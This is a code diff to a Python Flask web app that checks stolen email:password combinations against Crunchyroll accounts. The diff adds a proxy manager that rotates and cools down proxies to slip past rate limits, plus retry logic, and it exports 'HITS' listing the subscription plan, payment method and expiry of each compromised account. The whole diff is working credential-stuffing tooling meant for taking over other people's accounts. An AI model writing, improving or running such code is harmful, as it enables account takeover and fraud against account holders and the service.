@@ -14,6 +14,58 @@ app = Flask(__name__)
 tasks = {}
 task_lock = threading.Lock()
 
+class SmartProxyManager:
+    def __init__(self, proxies):
+        self.active = list(proxies)
+        self.cooldown = {}
+        self.lock = threading.Lock()
+        self.empty = len(proxies) == 0
+
+    def get_proxy(self):
+        if self.empty:
+            return None
+            
+        wait_time = 0
+        while wait_time < 30:
+            with self.lock:
+                if self.active:
+                    return self.active.pop(0)
+                
+                now = time.time()
+                resurrected = [p for p, t in self.cooldown.items() if t <= now]
+                for p in resurrected:
+                    self.active.append(p)
+                    del self.cooldown[p]
+                    
+                if self.active:
+                    return self.active.pop(0)
+            
+            time.sleep(1)
+            wait_time += 1
+            
+        return None
+
+    def report_success(self, proxy):
+        if not proxy: return
+        with self.lock:
+            if proxy not in self.active:
+                self.active.append(proxy)
+
+    def report_rate(self, proxy, cooldown_seconds=60):
+        if not proxy: return
+        with self.lock:
+            if proxy in self.active:
+                self.active.remove(proxy)
+            self.cooldown[proxy] = time.time() + cooldown_seconds
+
+    def report_dead(self, proxy):
+        if not proxy: return
+        with self.lock:
+            if proxy in self.active:
+                self.active.remove(proxy)
+            if proxy in self.cooldown:
+                del self.cooldown[proxy]
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -327,8 +379,7 @@ def check():
                 
     task_id = str(uuid.uuid4())
     
-    proxy_pool = list(working_proxies)
-    pool_lock = threading.Lock()
+    proxy_manager = SmartProxyManager(working_proxies)
     results = []
     results_lock = threading.Lock()
     logs = []
@@ -338,40 +389,45 @@ def check():
         with logs_lock:
             ts = time.strftime("%H:%M:%S")
             logs.append(f"[{ts}] {msg}")
-            
-    def remove_proxy(p):
-        with pool_lock:
-            if p in proxy_pool:
-                proxy_pool.remove(p)
-                return True
-            return False
 
     def check_combo(email, password):
-        while True:
-            with pool_lock:
-                if not proxy_pool:
-                    log(f"{email} -> PROXY ERROR (all burned)")
-                    return {'email': email, 'password': password, 'status': 'PROXY_ERROR', 'data': {}, 'error': 'All proxies burned'}
-                proxy = proxy_pool.pop(0)
-                proxy_pool.append(proxy)
+        max_attempts = 5
+        attempts = 0
+        
+        while attempts < max_attempts:
+            proxy = proxy_manager.get_proxy()
             
-            log(f"Checking {email} with proxy {proxy}...")
+            log(f"Checking {email} with proxy {proxy or 'DIRECT'}...")
             
             class SingleProxyMgr:
                 def __init__(self, p): self.p = p
                 def get_proxy(self): return self.p
                 def mark_bad(self): pass
             
-            checker = CrunchyrollChecker(SingleProxyMgr(proxy))
+            checker = CrunchyrollChecker(SingleProxyMgr(proxy) if proxy else None)
             res = checker.check_account(email, password)
+            status = res.get('status')
             
-            if res.get('status') == 'ERROR' and any(x in res.get('error', '').lower() for x in ['proxy', 'timeout', 'connection']):
-                log(f"Proxy {proxy} burned – removed from pool")
-                remove_proxy(proxy)
-                continue
-            
-            log(f"{email} -> {res.get('status')}")
-            return res
+            if status == 'HIT':
+                proxy_manager.report_success(proxy)
+                log(f"{email} -> HIT!")
+                return res
+                
+            elif status in ['INVALID', 'FREE']:
+                proxy_manager.report_success(proxy)
+                log(f"{email} -> BAD ({status})")
+                res['status'] = 'BAD'
+                res['error'] = status
+                return res
+                
+            else:
+                proxy_manager.report_rate(proxy, cooldown_seconds=60)
+                log(f"Proxy {proxy or 'DIRECT'} hit RATE/ERROR ({status}). Cooldown 60s.")
+                attempts += 1
+                time.sleep(2)
+                
+        log(f"{email} -> RATE (max retries exhausted)")
+        return {'email': email, 'password': password, 'status': 'RATE', 'data': {}, 'error': 'Max retries exhausted'}
 
     def run():
         with ThreadPoolExecutor(max_workers=5) as executor:
@@ -411,9 +467,8 @@ def download(task_id):
         task_results = tasks.get(task_id, [])
         
     hits = []
-    fails = []
-    errors = []
-    frees = []
+    bads = []
+    rates = []
 
     for res in task_results:
         e = res.get('email', '')
@@ -423,20 +478,12 @@ def download(task_id):
         if status == 'HIT':
             d = res.get('data', {})
             hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Payment: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}")
-        elif status == 'FREE':
-            frees.append(f"{e}:{p} | Free account - no subscription")
-        elif status == 'INVALID':
-            fails.append(f"{e}:{p} | Invalid credentials")
-        elif status == 'PROXY_ERROR':
-            errors.append(f"{e}:{p} | All proxies burned")
-        elif status == 'ERROR':
-            err_msg = res.get('error', 'Unknown error')
-            if any(x in err_msg.lower() for x in ['proxy', 'timeout', 'connection']):
-                errors.append(f"{e}:{p} | {err_msg}")
-            else:
-                fails.append(f"{e}:{p} | {err_msg}")
+        elif status == 'BAD':
+            reason = res.get('error', 'Invalid or Free')
+            bads.append(f"{e}:{p} | {reason}")
         else:
-            fails.append(f"{e}:{p} | {status}")
+            reason = res.get('error', 'Rate limit / Network Error')
+            rates.append(f"{e}:{p} | {reason}")
 
     sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     output = []
@@ -445,19 +492,15 @@ def download(task_id):
     output.append(sep)
     output.extend(hits)
     output.append("\n" + sep)
-    output.append("FAILED / INVALID")
+    output.append("BAD (Invalid / Free)")
     output.append(sep)
-    output.extend(fails)
+    output.extend(bads)
     output.append("\n" + sep)
-    output.append("PROXY ERRORS / RETRIED")
+    output.append("RATE (Rate Limits / Network Errors)")
     output.append(sep)
-    output.extend(errors)
+    output.extend(rates)
     output.append("\n" + sep)
-    output.append("FREE ACCOUNTS (No active subscription)")
-    output.append(sep)
-    output.extend(frees)
-    output.append("\n" + sep)
-    output.append(f"SUMMARY: HITS: {len(hits)} | FAILED: {len(fails)} | PROXY ERRORS: {len(errors)} | FREE: {len(frees)}")
+    output.append(f"SUMMARY: TOTAL HITS: {len(hits)} | BAD: {len(bads)} | RATE: {len(rates)}")
     output.append(sep)
 
     mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
